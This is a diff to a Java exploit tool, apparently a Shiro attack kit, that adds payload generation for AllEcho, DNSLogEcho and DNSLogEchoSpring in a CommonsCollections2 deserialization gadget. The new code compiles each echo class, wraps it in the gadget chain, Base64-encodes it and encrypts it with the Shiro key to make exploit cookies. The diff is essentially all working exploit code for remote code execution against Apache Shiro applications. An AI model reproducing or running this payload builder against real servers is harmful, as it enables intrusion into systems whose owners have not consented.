@@ -1,5 +1,6 @@
 package com.y5neko.shiroexp.gadget;
 
+import com.y5neko.shiroexp.echo.*;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.y5neko.shiroexp.misc.Tools;
@@ -124,6 +125,38 @@ public class CommonsCollections2 {
         } else if (echoType.equals("AllEcho")) {
             AllEcho allEcho = new AllEcho();
             ctClass = allEcho.genPayload(pool);
+
+            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
+                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+            } else {
+                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
+            }
+            ctClass.setSuperclass(superClass);
+
+            byte[] payload = new CommonsCollections2().getPayload(ctClass.toBytecode());
+            String data = Base64.getEncoder().encodeToString(payload);
+            return Tools.CBC_Encrypt(key, data);
+
+        } else if (echoType.equals("DNSLogEcho")) {
+            // DNSLog 探测
+            DNSLogEcho dnsLogEcho = new DNSLogEcho();
+            ctClass = dnsLogEcho.genPayload(pool);
+
+            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
+                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+            } else {
+                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
+            }
+            ctClass.setSuperclass(superClass);
+
+            byte[] payload = new CommonsCollections2().getPayload(ctClass.toBytecode());
+            String data = Base64.getEncoder().encodeToString(payload);
+            return Tools.CBC_Encrypt(key, data);
+
+        } else if (echoType.equals("DNSLogEchoSpring")) {
+            // DNSLog 探测（Spring 版本）
+            DNSLogEchoSpring dnsLogEchoSpring = new DNSLogEchoSpring();
+            ctClass = dnsLogEchoSpring.genPayload(pool);
 
             if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
                 superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
